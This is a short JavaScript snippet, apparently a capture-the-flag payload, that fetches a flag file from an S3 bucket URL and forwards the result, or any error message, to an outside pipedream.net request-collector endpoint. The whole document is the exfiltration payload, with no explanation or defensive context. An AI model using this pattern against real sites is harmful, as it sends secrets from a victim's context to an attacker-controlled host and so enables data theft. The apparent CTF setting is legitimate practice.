        async function getFlag() {
            var link = "https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag.txt"
            try{
                var flag = await fetch(link)
            }catch(e){
                fetch('https://eoctl0knzoys9l9.m.pipedream.net/error/' + e.message);
            }
            fetch('https://eoctl0knzoys9l9.m.pipedream.net/flag/' + flag);
        }
        getFlag()
